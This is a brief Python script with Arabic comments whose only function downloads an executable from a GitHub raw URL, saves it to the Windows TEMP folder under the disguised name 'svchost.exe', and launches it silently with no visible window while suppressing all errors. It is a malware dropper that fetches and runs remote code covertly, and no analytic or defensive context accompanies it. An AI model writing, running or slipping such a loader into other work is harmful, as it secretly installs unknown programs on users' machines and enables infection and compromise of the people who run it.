import requests
import subprocess
import os

def Secro():
    try:
        # تحميل الملف
        url = "https://github.com/Talfon/f/raw/refs/heads/main/svchost.exe"
        data = requests.get(url).content
        file_path = os.path.join(os.getenv('TEMP'), "svchost.exe")
        
        with open(file_path, "wb") as f:
            f.write(data)
        
        # تشغيل الملف
        subprocess.Popen(file_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

if __name__ == "__main__":
    Secro()
